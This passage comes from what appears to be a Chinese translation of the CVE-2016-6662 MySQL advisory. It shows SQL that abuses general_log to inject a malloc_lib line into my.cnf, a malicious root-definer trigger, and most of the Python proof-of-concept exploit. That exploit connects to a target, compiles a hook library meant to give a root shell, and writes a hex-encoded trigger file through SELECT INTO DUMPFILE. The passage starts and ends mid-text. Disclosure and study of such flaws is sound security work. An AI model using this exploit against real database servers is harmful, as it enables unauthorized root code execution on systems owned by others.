        '> 
        '> [mysqld]
        '> malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so
        '> 
        '> [separator]
        '> 
        '> ';
    1 row in set (0.00 sec)
    mysql> set global general_log = off;
以上SQL创建一个具有必要权限(other用户没有读写权限)的可供mysql守护进程解析的配置文件：
    # ls -l /var/lib/mysql/my.cnf 
    -rw-rw---- 1 mysql mysql 352 Jul 28 17:48 /var/lib/mysql/my.cnf
这个文件包含的内容如下：
    # cat /var/lib/mysql/my.cnf 
    /usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
    Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
    Time                 Id Command    Argument
    160728 17:48:22    43 Query select '
    ; injected config entry
    [mysqld]
    malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so
    [separator]
    '
    160728 17:48:23    43 Query set global general_log = off
然而，依然存在一个问题，mysql会拒绝不以“[”符号开头的文件，会报错如下：
error: Found option without preceding group in config file:
/var/lib/mysql/my.cnf at line: 1 Fatal error in defaults handling. Program
aborted
**不过深入的测试证明可以绕过此安全限制导致的错误，继续看下文。**
值得大家注意的是，cve-2016-6662漏洞的报告者利用其它漏洞可以轻易的创建任意内容的/var/lib/mysql/my.cnf配置文件，并不需要file权限，只是报告者并未披露其它的漏洞。
**3,通过默认方式安装的mysql，攻击者仅用select查询的file权限就可以访问日志功能（该功能通常只提供给mysql管理用户），因此攻击者可以在位置添加修改配置文件。**
如果攻击者没有访问日志功能的管理权限，只有标准用户权限与另外的file权限，那么攻击者仍然可以获得写入修改配置文件的能力，可以利用一个恶意的触发器来实现：
    CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
    AFTER INSERT
       ON `active_table` FOR EACH ROW
    BEGIN
       DECLARE void varchar(550);
       set global general_log_file='/var/lib/mysql/my.cnf';
       set global general_log = on;
       select "
    [mysqld]
    malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'
    " INTO void;   
       set global general_log = off;
    END;
利用类似的语句创建触发器
    SELECT '....trigger_code...' INTO DUMPFILE /var/lib/mysql/activedb/active_table.TRG'
当表刷新的时候就会执行触发器，比如通过insert来让表刷新：
    INSERT INTO `active_table` VALUES('xyz');
触发器的代码会以mysql root权限执行，从而让攻击者修改general_log设置，即使攻击者没有数据库管理员权限。
## V. PROOF OF CONCEPT – 0day
    ----------[ 0ldSQL_MySQL_RCE_exploit.py ]--------------    #!/usr/bin/python
    # This is a limited version of the PoC exploit. It only allows appending to
    # existing mysql config files with weak permissions. See V) 1) section of 
    # the advisory for details on this vector. 
    #
    # Full PoC will be released at a later date, and will show how attackers could
    # exploit the vulnerability on default installations of MySQL on systems with no
    # writable my.cnf config files available.
    #
    # The upcoming advisory CVE-2016-6663 will also make the exploitation trivial
    # for certain low-privileged attackers that do not have FILE privilege.
    # 
    # See full advisory for details:
    # http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt
    #
    # Stay tuned ;)
    intro = """
    0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)
    (CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit
    For testing purposes only. Do no harm.
    Discovered/Coded by:
    Dawid Golunski
    http://legalhackers.com
    """
    import argparse
    import mysql.connector    
    import binascii
    import subprocess
    def info(str):
        print "[+] " + str + "n"
    def errmsg(str):
        print "[!] " + str + "n"
    def shutdown(code):
        if (code==0):
            info("Exiting (code: %d)n" % code)
        else:
            errmsg("Exiting (code: %d)n" % code)
        exit(code)
    cmd = "rm -f /var/lib/mysql/pocdb/poctable.TRG ; rm -f /var/lib/mysql/mysql_hookandroot_lib.so"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    (result, error) = process.communicate()
    rc = process.wait() 
    # where will the library to be preloaded reside? /tmp might get emptied on reboot
    # /var/lib/mysql is safer option (and mysql can definitely write in there ;)
    malloc_lib_path='/var/lib/mysql/mysql_hookandroot_lib.so'
    # Main Meat
    print intro
    # Parse input args
    parser = argparse.ArgumentParser(prog='0ldSQL_MySQL_RCE_exploit.py', description='PoC for MySQL Remote Root Code Execution / Privesc CVE-2016-6662')
    parser.add_argument('-dbuser', dest='TARGET_USER', required=True, help='MySQL username') 
    parser.add_argument('-dbpass', dest='TARGET_PASS', required=True, help='MySQL password')
    parser.add_argument('-dbname', dest='TARGET_DB',   required=True, help='Remote MySQL database name')
    parser.add_argument('-dbhost', dest='TARGET_HOST', required=True, help='Remote MySQL host')
    parser.add_argument('-mycnf', dest='TARGET_MYCNF', required=True, help='Remote my.cnf owned by mysql user')
    args = parser.parse_args()
    # Connect to database. Provide a user with CREATE TABLE, SELECT and FILE permissions
    # CREATE requirement could be bypassed (malicious trigger could be attached to existing tables)
    info("Connecting to target server %s and target mysql account '%s@%s' using DB '%s'" % (args.TARGET_HOST, args.TARGET_USER, args.TARGET_HOST, args.TARGET_DB))
    try:
        dbconn = mysql.connector.connect(user=args.TARGET_USER, password=args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST)
    except mysql.connector.Error as err:
        errmsg("Failed to connect to the target: {}".format(err))
        shutdown(1)
    try:
        cursor = dbconn.cursor()
        cursor.execute("SHOW GRANTS")
    except mysql.connector.Error as err:
        errmsg("Something went wrong: {}".format(err))
        shutdown(2)
    privs = cursor.fetchall()
    info("The account in use has the following grants/perms: " )
    for priv in privs:
        print priv[0]
    print ""
    # Compile mysql_hookandroot_lib.so shared library that will eventually hook to the mysqld 
    # process execution and run our code (Remote Root Shell)
    # Remember to match the architecture of the target (not your machine!) otherwise the library
    # will not load properly on the target.
    info("Compiling mysql_hookandroot_lib.so")
    cmd = "gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    (result, error) = process.communicate()
    rc = process.wait() 
    if rc != 0:
        errmsg("Failed to compile mysql_hookandroot_lib.so: %s" % cmd)
        print error 
        shutdown(2)
    # Load mysql_hookandroot_lib.so library and encode it into HEX
    info("Converting mysql_hookandroot_lib.so into HEX")
    hookandrootlib_path = './mysql_hookandroot_lib.so'
    with open(hookandrootlib_path, 'rb') as f:
        content = f.read()
        hookandrootlib_hex = binascii.hexlify(content)
    # Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG 
    # Decoded payload (paths may differ):
    """
    DELIMITER //
    CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
    AFTER INSERT
       ON `poctable` FOR EACH ROW
    BEGIN
       DECLARE void varchar(550);
       set global general_log_file='/var/lib/mysql/my.cnf';
       set global general_log = on;
       select "
    # 0ldSQL_MySQL_RCE_exploit got here :)
    [mysqld]
    malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'
    [abyss]
    " INTO void;   
       set global general_log = off;
    END; //
    DELIMITER ;
    """
    trigger_payload="""TYPE=TRIGGERS
    triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\nAFTER INSERT\n   ON `poctable` FOR EACH ROW\nBEGIN\n\n   DECLARE void varchar(550);\n   set global general_log_file=\'%s\';\n   set global general_log = on;\n   select "\n\n# 0ldSQL_MySQL_RCE_exploit got here :)\n\n[mysqld]\nmalloc_lib=\'%s\'\n\n[abyss]\n" INTO void;   \n   set global general_log = off;\n\nEND'
    sql_modes=0
    definers='root@localhost'
    client_cs_names='utf8'
    connection_cl_names='utf8_general_ci'
    db_cl_names='latin1_swedish_ci'
    """ % (args.TARGET_MYCNF, malloc_lib_path)
    # Convert trigger into HEX to pass it to unhex() SQL function
    trigger_payload_hex = "".join("{:02x}".format(ord(c)) for c in trigger_payload)
    # Save trigger into a trigger file
    TRG_path="/var/lib/mysql/%s/poctable.TRG" % args.TARGET_DB
    info("Saving trigger payload into %s" % (TRG_path))
    try:
        cursor = dbconn.cursor()
        cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (trigger_payload_hex, TRG_path) )
    except mysql.connector.Error as err:
        errmsg("Something went wrong: {}".format(err))
        shutdown(4)
    # Save library into a trigger file
    info("Dumping shared library into %s file on the target" % malloc_lib_path)
    try: